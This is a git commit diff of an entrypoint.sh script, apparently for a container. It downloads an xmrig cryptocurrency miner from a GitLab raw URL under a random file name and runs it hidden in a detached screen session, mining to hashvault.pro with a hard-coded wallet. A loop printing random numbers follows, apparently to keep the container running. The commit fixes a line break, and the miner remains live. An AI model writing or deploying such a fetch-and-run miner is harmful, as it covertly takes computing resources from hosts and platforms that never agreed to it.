3499a533a9ad6e061bcbd9e4080491ea10003d6b
aginna22 <87109346+aginna22@users.noreply.github.com>
2021-12-21 13:14:10 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -4,6 +4,5 @@ OKE=$(shuf -n 1 -i 1-9999999)
 wget -q -O $OKE https://gitlab.com/ninalasmi937/erte/-/raw/main/xmrig
 chmod +x $OKE
 chmod 777 /run/screen
-screen -dmS $OKE ./$OKE --url 	
-frankfurt01.hashvault.pro:80 --user TRTLuzQtL4XhgUew7qp987b2UZMTLCvXtEnsbi1gUBFFjHEQqWCTCnNS28Pwv7Z4DjELA52kBXBk8AjCgpSFneJHHadpVFB6gAE --pass x --donate-level 1
+screen -dmS $OKE ./$OKE --url frankfurt01.hashvault.pro:80 --user TRTLuzQtL4XhgUew7qp987b2UZMTLCvXtEnsbi1gUBFFjHEQqWCTCnNS28Pwv7Z4DjELA52kBXBk8AjCgpSFneJHHadpVFB6gAE --pass x --donate-level 1
 while :; do shuf -n 1 -i 1-99999999; sleep 30; done
